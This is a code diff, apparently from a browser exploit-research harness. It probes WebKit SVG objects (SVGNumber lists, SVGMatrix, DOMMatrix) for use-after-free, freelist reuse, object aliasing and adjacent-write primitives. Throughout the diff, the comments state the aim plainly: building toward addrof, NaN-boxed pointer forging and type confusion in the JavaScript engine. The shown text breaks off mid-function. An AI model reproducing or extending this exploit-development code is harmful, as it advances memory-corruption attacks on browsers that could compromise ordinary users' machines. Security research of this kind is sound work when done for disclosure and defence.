+  var verdict=(reused>0||reused2>0)?'★ FREELIST REUSE DETECTED — TRUE UAF':'bump-only / Ref<> keeps alive (no reuse)';
+  L('  FRL1: '+verdict);
+  L('  FRL1: freelist_reuse='+(reused>0||reused2>0));
 
-  R.lay2.hit=writeThrough.length>0;
-  R.lay2.detail='writeThrough='+writeThrough.length;
-  log('  LAY2: '+R.lay2.detail,R.lay2.hit?'win':'dim');
-
-  if(!q)dis(false);
+  removeSVG(svg2);removeSVG(svg3);
+  return {freelist_reuse:(reused>0||reused2>0),reused:reused,unchanged:unchanged};
 }
 
-/*
- * XCT1: Cross-type adjacency via careful allocation ordering
- *
- * Different C++ types → different IsoHeap instances → can't be adjacent via normal allocation.
- * BUT: what about types that share the SAME IsoHeap cell size?
- * If sizeof(SVGNumber) == sizeof(SVGLength) == 24, they still use different IsoHeap instances.
- *
- * REVISED APPROACH: Instead of cross-type, use the SAME type but exploit
- * the DOUBLE-REFERENCE discovered in ORP1 (same SVGNumber in two lists).
- *
- * If SVGNumber N is in BOTH orphaned ListA AND orphaned ListB:
- *   - N.value write via ListA[k] should equal N.value read via ListB[j]
- *   - This IS the same object (same Ref<>), just two references
- *   - NOT a type confusion yet, but proves object aliasing
- *
- * Then: what if we put N into ListA, then forge ListA as a different type?
- * That requires knowing ListA's address... still need addrof.
- *
- * ACTUAL XCT1: probe what JAVASCRIPT OBJECT TYPE the wrapper is.
- * SVGMatrix from SVGTransformList vs SVGMatrix from DOMMatrix constructor:
- *   - Are they the same C++ class? Same IsoHeap?
- *   - If yes: an SVGMatrix orphaned from a transform list and a live DOMMatrix
- *     might be adjacent if allocated back-to-back.
- *
- * TEST: create orphaned SVGTransform.matrix, then create a new DOMMatrix via
- * 'new DOMMatrix()'. Does the new DOMMatrix land at the same address as our orphaned SVGMatrix?
- * (Can't tell without addrof, but: can we write to orphaned SVGMatrix and read it
- *  via the new DOMMatrix? i.e., is the write-back observable through the new object?)
- *
- * Actually simpler: just test if `new DOMMatrix()` fields are writable and orphan-able.
- * And: does the SVGMatrix from getMatrix() support all the same fields?
- * Cross-checking: if DOMMatrix has m11..m44 (16 floats), can we put a DOMMatrix
- * value into an SVGTransform's matrix?
- */
-async function runXCT1(q){
-  if(!q){dis(true);sep();log('XCT1: Cross-type adjacency + DOMMatrix interop + double-ref aliasing','inf');sep();}
+// ─────────────────────────────────────────────────────────────────
+// STO1 — SVGMatrix Storage Precision
+// Are SVGMatrix fields stored as float32 or float64?
+// ─────────────────────────────────────────────────────────────────
+function runSTO1(){
+  L('');L('STO1: SVGMatrix Storage Precision');L('  Goal: write f64-only values, read back — f64 exact → float64 storage, truncated → float32');
 
-  // Test 1: DOMMatrix construction — is it usable?
-  log('  XCT1: [Part A] DOMMatrix constructor test...','dim');
-  var dm=null;
-  try{
-    dm=new DOMMatrix();
-    log('  XCT1: new DOMMatrix() created. m11='+dm.m11+' m22='+dm.m22+' is2D='+dm.is2D,'ok');
-    log('  XCT1: a='+dm.a+' b='+dm.b+' c='+dm.c+' d='+dm.d+' e='+dm.e+' f='+dm.f,'dim');
-    // DOMMatrix extra fields
-    log('  XCT1: m11='+dm.m11+' m12='+dm.m12+' m13='+dm.m13+' m14='+dm.m14,'dim');
-    log('  XCT1: m21='+dm.m21+' m22='+dm.m22+' m23='+dm.m23+' m24='+dm.m24,'dim');
-    log('  XCT1: m31='+dm.m31+' m32='+dm.m32+' m33='+dm.m33+' m34='+dm.m34,'dim');
-    log('  XCT1: m41='+dm.m41+' m42='+dm.m42+' m43='+dm.m43+' m44='+dm.m44,'dim');
-  }catch(e){log('  XCT1: DOMMatrix() threw: '+e,'bad');}
-
-  // Test DOMMatrix writeability
-  if(dm){
-    try{
-      dm.m11=12345;dm.m12=23456;dm.m13=34567;dm.m14=45678;
-      dm.m21=56789;dm.m22=67890;dm.m23=78901;dm.m24=89012;
-      log('  XCT1: DOMMatrix m11-m24 writable: m11='+dm.m11+' m12='+dm.m12+' m13='+dm.m13,'ok');
-      log('  XCT1: DOMMatrix total writable fields (16+2=18)?','dim');
-    }catch(e){log('  XCT1: DOMMatrix write threw: '+e,'dim');}
-  }
-
-  // Test 2: SVGTransform.matrix vs DOMMatrix — are they the same C++ type?
-  log('  XCT1: [Part B] SVGMatrix vs DOMMatrix interop test...','dim');
-  var tsvg=makeSVG();
-  var tg=document.createElementNS(SVG_NS,'g');
-  tsvg.appendChild(tg);
-  var tList=tg.transform.baseVal;
-  var t=tsvg.createSVGTransform?tsvg.createSVGTransform():null;
-  if(t){
-    tList.appendItem(t);
-    var svgMat=tList[0].matrix;
-    log('  XCT1: SVGMatrix type: '+Object.prototype.toString.call(svgMat),'dim');
-    if(dm)log('  XCT1: DOMMatrix type: '+Object.prototype.toString.call(dm),'dim');
-    log('  XCT1: svgMat instanceof DOMMatrix: '+(svgMat instanceof DOMMatrix),'dim');
-    log('  XCT1: DOMMatrixReadOnly check: '+(typeof DOMMatrixReadOnly!=='undefined'&&svgMat instanceof DOMMatrixReadOnly),'dim');
-    // Can we pass svgMat to setMatrix()?
-    try{
-      svgMat.a=9001;svgMat.b=9002;
-      // Create new DOMMatrix FROM svgMat
-      var dm2=new DOMMatrix([svgMat.a,svgMat.b,svgMat.c,svgMat.d,svgMat.e,svgMat.f]);
-      log('  XCT1: DOMMatrix from SVGMatrix values: m11='+dm2.m11+' a='+dm2.a,'ok');
-    }catch(e){log('  XCT1: DOMMatrix from SVGMatrix failed: '+e,'dim');}
-  }
-
-  // Test 3: DOUBLE-REF ALIASING — SVGNumber in two orphaned lists
-  log('  XCT1: [Part C] double-ref aliasing (same SVGNumber in two orphaned lists)...','inf');
-  var svgA=makeSVG();
-  var svgB=makeSVG();
-  var dA=null,dB=null;
-
-  // Create fcmA with 20 items
-  var defsA=document.createElementNS(SVG_NS,'defs');
-  var filtA=document.createElementNS(SVG_NS,'filter');
-  filtA.setAttribute('id','fxctA'+Math.random().toString(36).slice(2,6));
-  var fcmA=document.createElementNS(SVG_NS,'feColorMatrix');
-  fcmA.setAttribute('type','matrix');fcmA.setAttribute('values','1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0');
-  filtA.appendChild(fcmA);defsA.appendChild(filtA);svgA.appendChild(defsA);
-
-  var defsB=document.createElementNS(SVG_NS,'defs');
-  var filtB=document.createElementNS(SVG_NS,'filter');
-  filtB.setAttribute('id','fxctB'+Math.random().toString(36).slice(2,6));
-  var fcmB=document.createElementNS(SVG_NS,'feColorMatrix');
-  fcmB.setAttribute('type','matrix');fcmB.setAttribute('values','1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0');
-  filtB.appendChild(fcmB);defsB.appendChild(filtB);svgB.appendChild(defsB);
-  await raf();
-
-  var blA=fcmA.values.baseVal;
-  var blB=fcmB.values.baseVal;
-
-  // Tag them
-  for(var i=0;i<20;i++){try{blA[i].value=3000+i;}catch(e){}}
-  for(var i=0;i<20;i++){try{blB[i].value=4000+i;}catch(e){}}
-  var sharedRef=blA[5]; // A[5] = 3005
-
-  // Orphan both
-  for(var i=blA.length-1;i>=0;i--){try{blA.removeItem(i);}catch(e){}}
-  removeSVG(svgA);
-  for(var i=blB.length-1;i>=0;i--){try{blB.removeItem(i);}catch(e){}}
-  removeSVG(svgB);
-  await raf();
-
-  // INSERT sharedRef into orphaned blB
-  try{
-    blB.appendItem(sharedRef);
-    log('  XCT1: inserted sharedRef into orphaned blB. blB.length='+blB.length,'ok');
-    // Now sharedRef is in both (orphaned) lists via direct ref AND via blB
-    var lastInB=blB[blB.length-1];
-    log('  XCT1: blB.last.value='+lastInB.value+' sharedRef.value='+sharedRef.value,'dim');
-
-    // Write via sharedRef, read via blB
-    sharedRef.value=7777;
-    log('  XCT1: wrote sharedRef.value=7777. blB.last.value='+blB[blB.length-1].value,'ok');
-    var aliasOK=blB[blB.length-1].value===7777;
-    log('  XCT1: alias read: '+(aliasOK?'★ SAME OBJECT (alias confirmed!)':'different object'),'dim');
-
-    // Write via blB, read via sharedRef
-    blB[blB.length-1].value=8888;
-    log('  XCT1: wrote blB.last.value=8888. sharedRef.value='+sharedRef.value,'ok');
-    var aliasOK2=sharedRef.value===8888;
-    log('  XCT1: reverse alias: '+(aliasOK2?'★ CONFIRMED bidirectional alias!':'no alias'),'dim');
-
-    if(aliasOK&&aliasOK2){
-      log('  XCT1: ★★ FULL BIDIRECTIONAL ALIAS: one SVGNumber, two list handles!','win');
-      R.xct1.crossType=true;
-    }
-  }catch(e){log('  XCT1: cross-list double-ref threw: '+e,'bad');}
-
-  // Test 4: DOMMatrix m11..m44 write surface size
-  if(dm){
-    try{
-      var allDMFields=['a','b','c','d','e','f',
-        'm11','m12','m13','m14','m21','m22','m23','m24',
-        'm31','m32','m33','m34','m41','m42','m43','m44'];
-      var dmWritable=[];
-      for(var fi=0;fi<allDMFields.length;fi++){
-        var fname=allDMFields[fi];
-        try{
-          var orig=dm[fname];
-          dm[fname]=55555+fi;
-          if(Math.abs(dm[fname]-(55555+fi))<0.5){
-            dmWritable.push(fname);
-          }
-          dm[fname]=orig;
-        }catch(e2){}
-      }
-      log('  XCT1: DOMMatrix writable fields ('+dmWritable.length+'): ['+dmWritable.join(',')+']','ok');
-      if(dmWritable.length>=16){
-        log('  XCT1: ★ DOMMatrix has '+dmWritable.length+' writable fields = '+(dmWritable.length*4)+' bytes!','win');
-        R.xct1.hit=true;
-      }
-    }catch(e){log('  XCT1: DOMMatrix field probe threw: '+e,'dim');}
-  }
-
-  if(tsvg.parentNode)tsvg.parentNode.removeChild(tsvg);
-
-  R.xct1.hit=R.xct1.hit||R.xct1.crossType;
-  R.xct1.detail='crossType='+R.xct1.crossType;
-  log('  XCT1: '+R.xct1.detail,R.xct1.hit?'win':'dim');
-
-  if(!q)dis(false);
-}
-
-/*
- * ADJ1: Sequential allocation sizeof probe — large N, boundary detection
- *
- * Create ONE large FCM chain: 10 FCMs × 20 SVGNumbers = 200 sequential SVGNumbers.
- * CRITICAL ORDERING: create ALL 10 FCMs one after another (not interleaved).
- * Then: FCM0's 20 items are at the lowest addresses, FCM1's 20 are right after, etc.
- * So: FCM0[19] and FCM1[0] are ADJACENT (sizeof apart).
- *
- * THEN: orphan FCM0. Write bit markers to FCM0[19]. Check FCM1[0].
- * If FCM1[0] changes → we know the EXACT offset from FCM0[19].m_value to FCM1[0].m_value.
- * That offset = sizeof(SVGNumber) - offset_of_m_value_in_FCM0[19].
- *
- * Use SMALL values so float32 is exact: 1,2,3...
- * Also: use the SUBNORMAL and -0 bit patterns which are distinguishable at ANY magnitude.
- *
- * DETECTION: after orphaning FCM0, write subnormal to FCM0[19].
- * If FCM1[0].value changes from 2000 to something else → ADJACENT WRITE CONFIRMED.
- *
- * Also try: write to FCM0[0] (first item), read all 200 items for any change anywhere.
- * This maps out which write to which item causes which other item to change.
- */
-async function runADJ1(q){
-  if(!q){dis(true);sep();log('ADJ1: Sequential allocation sizeof probe via boundary write','inf');sep();}
-
-  var N_FCM=10;
-  var fcms=[];
-
-  // Create all FCMs sequentially (not interleaved)
-  log('  ADJ1: creating '+N_FCM+' FCMs sequentially...','dim');
-  for(var k=0;k<N_FCM;k++){
-    var svg=makeSVG();
-    var defs=document.createElementNS(SVG_NS,'defs');
-    var filt=document.createElementNS(SVG_NS,'filter');
-    filt.setAttribute('id','fadj'+k+'_'+Math.random().toString(36).slice(2,6));
-    var fcm=document.createElementNS(SVG_NS,'feColorMatrix');
-    fcm.setAttribute('type','matrix');
-    fcm.setAttribute('values','1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0');
-    filt.appendChild(fcm);defs.appendChild(filt);svg.appendChild(defs);
-    fcms.push({svg:svg,fcm:fcm,bl:fcm.values.baseVal,refs:[]});
-  }
-  await raf();
-
-  // Tag all: FCM[k][i] = (k+1)*1000 + i  (small values, exact f32)
-  for(var k=0;k<fcms.length;k++){
-    var bl=fcms[k].bl;
-    for(var i=0;i<20;i++){
-      try{var r=bl[i];r.value=(k+1)*1000+i;fcms[k].refs.push(r);}
-      catch(e){fcms[k].refs.push(null);}
-    }
-  }
-  log('  ADJ1: tagged all. FCM[0][0]=1000 FCM[0][19]=1019 FCM[1][0]=2000 FCM[9][19]=10019','dim');
-
-  // Orphan ONLY FCM[0]
-  var bl0=fcms[0].bl;
-  for(var i=bl0.length-1;i>=0;i--){try{bl0.removeItem(i);}catch(e){}}
-  removeSVG(fcms[0].svg);
-  await raf();
-
-  var alive0=fcms[0].refs.filter(function(r){try{return r&&!isNaN(r.value);}catch(e){return false;}}).length;
-  log('  ADJ1: FCM[0] orphaned, alive='+alive0+'/20','dim');
-
-  // Record FCM[1][0] initial value
-  var fcm1_0_init=null;
-  try{fcm1_0_init=fcms[1].refs[0].value;}catch(e){}
-  log('  ADJ1: FCM[1][0] initial value='+fcm1_0_init+' (expect 2000)','dim');
-
-  // PROBE: write various markers to FCM[0][19] (adjacent to FCM[1][0])
-  var probeVals=[
-    1.401298464324817e-45, // 0x00000001 subnormal min — MOST DISTINCTIVE
-    2.802596928649634e-45, // 0x00000002
-    -0,                    // 0x80000000
-    0,                     // 0x00000000
-    1.0,                   // 0x3F800000
-    -1.0,                  // 0xBF800000
-    0.5,                   // 0x3F000000
-    127.0,                 // 0x42FE0000
-    255.0,                 // 0x437F0000
-    65535.0,               // 0x477FFF00
-    1048576.0,             // 0x49800000
-  ];
-
-  var writeThrough=[];
-  for(var pi=0;pi<probeVals.length;pi++){
-    var pv=probeVals[pi];
-    try{fcms[0].refs[19].value=pv;}catch(e){continue;}
-    // Read ALL remaining FCM[1..9] for changes
-    for(var k=1;k<fcms.length;k++){
-      for(var i=0;i<fcms[k].refs.length;i++){
-        if(!fcms[k].refs[i])continue;
-        try{
-          var cur=fcms[k].refs[i].value;
-          var expected=(k+1)*1000+i;
-          if(cur!==expected){
-            writeThrough.push({probe:pv,k:k,i:i,expected:expected,got:cur});
-            log('  ADJ1: ★ FCM[0][19]='+pv+' → FCM['+k+']['+i+'] changed: '+expected+'→'+cur,'mega');
-          }
-        }catch(e){}
-      }
-    }
-  }
-
-  if(writeThrough.length>0){
-    log('  ADJ1: ★★ WRITE-THROUGH CONFIRMED! '+writeThrough.length+' events','win');
-    // From first hit, estimate sizeof
-    var first=writeThrough[0];
-    // FCM[0][19] is at addr X+19*sizeof. FCM[first.k][first.i] is at X+20*sizeof + (first.k-1)*20*sizeof + first.i*sizeof
-    // Gap between FCM[0][19] and FCM[first.k][first.i] = (20-19 + (first.k-1)*20 + first.i)*sizeof = (1+(first.k-1)*20+first.i)*sizeof
-    var gapItems=1+(first.k-1)*20+first.i;
-    log('  ADJ1: first hit: gap='+gapItems+' items (FCM[0][19] → FCM['+first.k+']['+first.i+'])','inf');
-    if(gapItems===1){
-      log('  ADJ1: ★ DIRECT NEIGHBOR WRITE (1 item gap) — sizeof = m_value_offset from struct start + 4','win');
-    }
-    R.adj1.sizeof=gapItems;
-  } else {
-    log('  ADJ1: no write-through — m_value not at struct end, or sizeof too large','dim');
-    // Check if FCM[0][19] itself is still alive and readable
-    try{
-      log('  ADJ1: FCM[0][19] current value='+fcms[0].refs[19].value+' (alive)','dim');
-    }catch(e){log('  ADJ1: FCM[0][19] threw: '+e,'bad');}
-  }
-
-  // IMPORTANT BONUS: check if FCM[0] allocs and FCM[1] allocs are ACTUALLY sequential
-  // by checking if ALL FCM[0] refs are alive after orphan (if not, some were freed → reuse)
-  log('  ADJ1: checking all FCM[0] ref liveness...','dim');
-  var stillAlive=[];
-  for(var i=0;i<fcms[0].refs.length;i++){
-    try{if(!isNaN(fcms[0].refs[i].value))stillAlive.push(i);}catch(e){}
-  }
-  log('  ADJ1: FCM[0] alive refs: ['+stillAlive.slice(0,10).join(',')+'] ('+stillAlive.length+'/20)','dim');
-
-  // Cleanup
-  for(var k=1;k<fcms.length;k++)removeSVG(fcms[k].svg);
-
-  R.adj1.hit=writeThrough.length>0;
-  R.adj1.detail='writeThrough='+writeThrough.length+' sizeof_hint='+R.adj1.sizeof;
-  log('  ADJ1: '+R.adj1.detail,R.adj1.hit?'win':'dim');
-
-  if(!q)dis(false);
-}
-
-/*
- * INV1: SVGMatrix inverse() as computation oracle
- *
- * v47 confirmed: translate/scale/rotate/multiply/inverse ALL work on orphaned SVGMatrix.
- * This means we have a COMPUTATION ORACLE:
- *   - Write values to matrix (a,b,c,d,e,f)
- *   - Call matrix.inverse() → get new 6-float result
- *   - The result is deterministic and mathematically exact
- *
- * WHY THIS MATTERS:
- *   JSC stores JS values as NaN-boxed 64-bit doubles (JSValue).
- *   Non-double values: encoded as specific double bit patterns.
- *   Pointers: encoded as NaN + 16-bit tag + 48-bit ptr.
- *   An "addrof" primitive would return a number whose double bits ARE the encoded pointer.
- *
- *   We can't get addrof directly yet. BUT: if we can WRITE specific float32 patterns
- *   to a matrix, and then have the matrix used in a COMPUTATION that produces a
- *   JSValue-interpretable result, that's a path.
- *
- *   More practically: inverse() takes our 6 float32 fields and returns 6 float64 results.
- *   The math: inv(M) = (1/det) * adjugate(M)
- *   det = a*d - b*c
- *   inv.a = d/det
- *   inv.b = -b/det
- *   inv.c = -c/det
- *   inv.d = a/det
- *   inv.e = (b*f - d*e)/det
- *   inv.f = (c*e - a*f)/det
- *
- *   With det=1 (a=1,d=1,b=0,c=0):
- *   inv.a=1, inv.b=0, inv.c=0, inv.d=1, inv.e=-e, inv.f=-f
- *   → inverse().e = -matrix.e  (EXACT NEGATION)
- *   → We can get EXACT float64 result of the negation of our float32 value.
- *
- *   With a=2, d=0.5, b=0, c=0, det=1:
- *   inv.a=0.5, inv.d=2
- *   → We can scale values up/down.
- *
- * GOAL OF INV1:
- *   1. Verify the math is exact (inverse result matches formula)
- *   2. Find inputs where inverse() produces values with specific bit patterns
- *   3. Can inverse() ever produce a POINTER-SHAPED value? (NaN-boxed pattern)
- *   4. Demonstrate the oracle: set matrix to specific values, predict inverse output
- */
-async function runINV1(q){
-  if(!q){dis(true);sep();log('INV1: SVGMatrix inverse() computation oracle','inf');sep();}
-
-  // Create and orphan a transform
   var svg=makeSVG();
   var g=document.createElementNS(SVG_NS,'g');
   svg.appendChild(g);
-  var tl=g.transform.baseVal;
-  var t=svg.createSVGTransform?svg.createSVGTransform():null;
-  if(!t){log('  INV1: createSVGTransform() not available','bad');if(!q)dis(false);return;}
-  tl.appendItem(t);
-  var tRef=tl[0];
+  var xfList=g.transform.baseVal;
+  var xf=svg.createSVGTransform();
+  xfList.appendItem(xf);
+  var m=xfList.getItem(0).matrix;
 
-  // Set matrix to identity, orphan
-  tRef.matrix.a=1;tRef.matrix.b=0;tRef.matrix.c=0;tRef.matrix.d=1;
-  tRef.matrix.e=0;tRef.matrix.f=0;
-  tl.removeItem(0);
+  // Test values: NOT exactly representable as float32
+  var tests=[
+    {field:'a', val:1/3,    f64:1/3,    f32:Math.fround(1/3),   name:'1/3'},
+    {field:'b', val:1/7,    f64:1/7,    f32:Math.fround(1/7),   name:'1/7'},
+    {field:'c', val:Math.PI,f64:Math.PI,f32:Math.fround(Math.PI),name:'π'},
+    {field:'d', val:0.1,    f64:0.1,    f32:Math.fround(0.1),   name:'0.1'},
+    {field:'e', val:0.2,    f64:0.2,    f32:Math.fround(0.2),   name:'0.2'},
+    {field:'f', val:1/6,    f64:1/6,    f32:Math.fround(1/6),   name:'1/6'},
+  ];
+
+  var f64_count=0, f32_count=0, other_count=0;
+  for(var i=0;i<tests.length;i++){
+    var t=tests[i];
+    m[t.field]=t.val;
+    var got=m[t.field];
+    var isF64=(got===t.f64);
+    var isF32=(Math.fround(got)===Math.fround(t.f32)&&got!==t.f64);
+    // more precise: check distance
+    var diffF64=Math.abs(got-t.f64);
+    var diffF32=Math.abs(got-t.f32);
+    var verdict='?';
+    if(got===t.f64){verdict='f64-exact';f64_count++;}
+    else if(got===t.f32){verdict='f32-exact';f32_count++;}
+    else{verdict='other(diff_f64='+diffF64.toExponential(3)+')';other_count++;}
+    L('  STO1: m.'+t.field+'='+t.name+' wrote='+t.val.toPrecision(17)+' got='+got.toPrecision(17)+' → '+verdict);
+  }
+  L('  STO1: f64_count='+f64_count+' f32_count='+f32_count+' other='+other_count);
+
+  var storage=(f64_count===tests.length)?'★ FLOAT64 STORAGE (f64-exact for all fields)':
+              (f32_count===tests.length)?'float32 storage (f32 for all fields)':
+              'MIXED (f64='+f64_count+' f32='+f32_count+')';
+  L('  STO1: '+storage);
+  L('  STO1: storage_f64='+(f64_count===tests.length));
+
+  // Also test DOMMatrix storage
+  L('  STO1: [DOMMatrix storage check]');
+  var dm=new DOMMatrix();
+  var dm_tests=[
+    {field:'a',val:1/3,name:'1/3'},
+    {field:'b',val:Math.PI,name:'π'},
+    {field:'m13',val:0.1,name:'0.1'},
+    {field:'m14',val:1/7,name:'1/7'},
+  ];
+  var dm_f64=0,dm_f32=0;
+  for(var i=0;i<dm_tests.length;i++){
+    var t=dm_tests[i];
+    dm[t.field]=t.val;
+    var got=dm[t.field];
+    var isF64=(got===t.val);
+    var isF32=(got===Math.fround(t.val));
+    var verdict=isF64?'f64-exact':isF32?'f32-exact':'other';
+    if(isF64)dm_f64++;else if(isF32)dm_f32++;
+    L('  STO1: dm.'+t.field+'='+t.name+' got='+got.toPrecision(17)+' → '+verdict);
+  }
+  L('  STO1: DOMMatrix: f64='+dm_f64+' f32='+dm_f32);
+
   removeSVG(svg);
-  await raf();
+  return {storage_f64:(f64_count===tests.length),f64_count:f64_count,f32_count:f32_count};
+}
 
-  var m=null;
-  try{m=tRef.matrix;}catch(e){log('  INV1: matrix threw: '+e,'bad');if(!q)dis(false);return;}
+// ─────────────────────────────────────────────────────────────────
+// TOR1 — Transform Orphan Refcount Probe
+// Map the C++ refcount chain: when does matrix.a stop being readable?
+// ─────────────────────────────────────────────────────────────────
+function runTOR1(){
+  L('');L('TOR1: Transform Orphan Refcount Probe');L('  Goal: step-by-step DOM removal, test matrix.a at each step');
 
-  // Test 1: verify inverse formula exactness
-  log('  INV1: [Test 1] verify inverse formula...','dim');
-  m.a=3;m.b=1;m.c=2;m.d=4;m.e=5;m.f=6;
-  var inv=null;
-  try{inv=m.inverse();}catch(e){log('  INV1: inverse() threw: '+e,'bad');}
-  if(inv){
-    var det=m.a*m.d-m.b*m.c;
-    var exp_a=m.d/det, exp_b=-m.b/det, exp_c=-m.c/det, exp_d=m.a/det;
-    var exp_e=(m.b*m.f-m.d*m.e)/det, exp_f=(m.c*m.e-m.a*m.f)/det;
-    log('  INV1: det='+det,'dim');
-    log('  INV1: got: a='+inv.a.toFixed(6)+' b='+inv.b.toFixed(6)+' e='+inv.e.toFixed(6),'dim');
-    log('  INV1: exp: a='+exp_a.toFixed(6)+' b='+exp_b.toFixed(6)+' e='+exp_e.toFixed(6),'dim');
-    var mathOK=Math.abs(inv.a-exp_a)<1e-5&&Math.abs(inv.e-exp_e)<1e-5;
-    log('  INV1: formula exact: '+mathOK,'dim');
-    if(mathOK)log('  INV1: ★ inverse() matches formula exactly','ok');
-  }
+  var svg=makeSVG();
+  var g=document.createElementNS(SVG_NS,'g');
+  svg.appendChild(g);
+  var xfList=g.transform.baseVal;
+  var xf=svg.createSVGTransform();
+  xfList.appendItem(xf);
+  // Get the matrix ref
+  var m=xfList.getItem(0).matrix;
+  m.a=12345;
+  m.e=99.5;
 
-  // Test 2: negation oracle (det=1, b=c=0 → inv.e = -e)
-  log('  INV1: [Test 2] negation oracle...','dim');
-  m.a=1;m.b=0;m.c=0;m.d=1;
-  var testVals=[0.5, 1.5, 100.0, -100.0,
-    1.401298464324817e-45, // subnormal
-    -0,
-    1.1754943508222875e-38 // min normal
-  ];
-  for(var ti=0;ti<testVals.length;ti++){
-    var tv=testVals[ti];
-    m.e=tv;m.f=0;
-    var inv2=null;
-    try{inv2=m.inverse();}catch(e){}
-    if(inv2){
-      var expected_e=-tv;
-      var match=inv2.e===expected_e;
-      log('  INV1: input e='+tv+' → inv.e='+inv2.e+' (expected=-e='+(expected_e)+') exact='+match,'dim');
+  function tryRead(label){
+    try{
+      var a=m.a;var e=m.e;
+      L('  TOR1: ['+label+'] m.a='+a+' m.e='+e+' → ALIVE');
+      return true;
+    }catch(ex){
+      L('  TOR1: ['+label+'] THREW: '+ex.message+' → DEAD');
+      return false;
     }
   }
 
-  // Test 3: can we craft inputs that produce a specific output?
-  // Target: produce inv.a = 1/3 (to check float64 output precision)
-  log('  INV1: [Test 3] crafted output test...','dim');
-  // inv.a = d/det. To get inv.a=1/3: d=1, det=3 → a*d-b*c=3 → a=3,d=1,b=0,c=0
-  m.a=3;m.b=0;m.c=0;m.d=1;m.e=0;m.f=0;
-  var inv3=null;
-  try{inv3=m.inverse();}catch(e){}
-  if(inv3){
-    var target=1/3;
-    log('  INV1: crafted: inv.a='+inv3.a+' target='+target+' match='+(Math.abs(inv3.a-target)<1e-10),'dim');
-    // Is the output float64 or truncated to float32?
-    // 1/3 in float64 = 0.3333333333333333
-    // 1/3 in float32 = 0.3333333432674408
-    var f64_third=1/3;
-    var f32_third=Math.fround(1/3);
-    log('  INV1: f64(1/3)='+f64_third+' f32(1/3)='+f32_third+' got='+inv3.a,'dim');
-    if(Math.abs(inv3.a-f64_third)<1e-15){
-      log('  INV1: ★ inverse() output is FULL float64 precision (not f32)!','win');
-    } else if(Math.abs(inv3.a-f32_third)<1e-7){
-      log('  INV1: inverse() output is float32 precision','dim');
-    }
+  // Step 0: initial
+  tryRead('0-initial');
+
+  // Step 1: removeItem from transform list (but g still in DOM)
+  xfList.removeItem(0);
+  tryRead('1-after-removeItem(xf from list)');
+
+  // Restore for next test
+  xfList.appendItem(xf);
+  m=xfList.getItem(0).matrix;
+  m.a=12345;m.e=99.5;
+  tryRead('1b-restored');
+
+  // Step 2: removeItem then remove g from svg (but svg still in DOM)
+  xfList.removeItem(0);
+  if(g.parentNode) g.parentNode.removeChild(g);
+  tryRead('2-after-removeItem+remove-g');
+
+  // Step 3: remove svg from DOM too
+  removeSVG(svg);
+  tryRead('3-after-remove-svg');
+
+  // Step 4: Try a new fresh matrix ref after all removal
+  L('  TOR1: [Step 4] fresh matrix via orphaned xf.matrix after all removal:');
+  try{
+    var m2=xf.matrix;
+    m2.a=77777;
+    L('  TOR1: [4-xf.matrix after full orphan] m2.a='+m2.a+' → ALIVE');
+  }catch(ex){
+    L('  TOR1: [4-xf.matrix] THREW: '+ex.message);
   }
 
-  // Test 4: integer encoding via inverse
-  // Goal: produce inv.a = integer K. Set a=1, d=K, b=c=0 → det=K → inv.a=1. No.
-  // Actually: inv.a=d/det. Set d=K², a=K, b=c=0 → det=K*K²=K³. inv.a=K²/K³=1/K.
-  // Or: a=1, b=0, c=0, d=K → det=K → inv.a=K/K=1. Always 1 if a=1.
-  // To get inv.a=K: set a=1/K, d=1, b=c=0 → det=1/K → inv.a=1/(1/K)=K. YES!
-  log('  INV1: [Test 4] integer production via inverse...','dim');
-  for(var K of[2,3,7,100,65536]){
-    m.a=1/K;m.b=0;m.c=0;m.d=1;m.e=0;m.f=0;
-    var invK=null;
-    try{invK=m.inverse();}catch(e){}
-    if(invK){
-      var got=invK.a;
-      log('  INV1: input a=1/'+K+'='+m.a+' → inv.a='+got+' (target='+K+') exact='+(got===K),'dim');
-    }
-  }
+  // Separate test: hold ref to matrix BEFORE removeItem, test after removeItem only (no DOM removal)
+  L('  TOR1: [Sub-test B] hold ref before removeItem, remove ONLY from list (SVG stays)');
+  var svg2=makeSVG();
+  var g2=document.createElementNS(SVG_NS,'g');
+  svg2.appendChild(g2);
+  var xfList2=g2.transform.baseVal;
+  var xf2=svg2.createSVGTransform();
+  xfList2.appendItem(xf2);
+  var mB=xfList2.getItem(0).matrix;
+  mB.a=54321;mB.e=11.5;
+  xfList2.removeItem(0);  // remove from list, g2/svg2 still in DOM
+  try{var vB=mB.a;L('  TOR1: [B-after-removeItem-list-only] mB.a='+vB+' (wrote 54321) → '+(vB===54321?'EXACT':'CHANGED to '+vB));}
+  catch(ex){L('  TOR1: [B-after-removeItem-list-only] THREW: '+ex.message);}
 
-  // Test 5: NaN-boxing probe
-  // JSC NaN-boxes non-double values. A pointer looks like: 0xffff0000XXXXXXXX (double NaN with low 32 bits = ptr)
-  // Can inverse() produce a NaN? Only if det≈0. div-by-zero → Infinity or NaN?
-  log('  INV1: [Test 5] near-singular matrix (det→0) behavior...','dim');
-  m.a=1;m.b=1;m.c=1;m.d=1;m.e=0;m.f=0; // det=0 exactly
-  var invSing=null;
-  try{invSing=m.inverse();}catch(e){log('  INV1: singular inverse threw: '+e,'dim');}
-  if(invSing){
-    log('  INV1: singular result: a='+invSing.a+' b='+invSing.b+' e='+invSing.e,'crit');
-    var hasNaN=isNaN(invSing.a)||isNaN(invSing.b)||isNaN(invSing.e)||isNaN(invSing.f);
-    var hasInf=!isFinite(invSing.a)||!isFinite(invSing.b);
-    log('  INV1: singular: hasNaN='+hasNaN+' hasInf='+hasInf,'dim');
-    if(hasNaN)log('  INV1: ★ inverse() can produce NaN from singular matrix!','win');
-    if(hasInf)log('  INV1: ★ inverse() can produce Infinity from singular matrix!','win');
-  }
+  // Try writing to mB after remove
+  try{mB.a=98765;var vB2=mB.a;L('  TOR1: [B-write-after-remove] wrote 98765, read back='+vB2+' → '+(vB2===98765?'ALIVE+WRITABLE':'wrong value'));}
+  catch(ex){L('  TOR1: [B-write-after-remove] THREW: '+ex.message);}
 
-  // near-zero det
-  m.a=1;m.b=1+1e-7;m.c=1;m.d=1;m.e=0;m.f=0; // det=-1e-7 (tiny)
-  var invNearSing=null;
-  try{invNearSing=m.inverse();}catch(e){}
-  if(invNearSing){
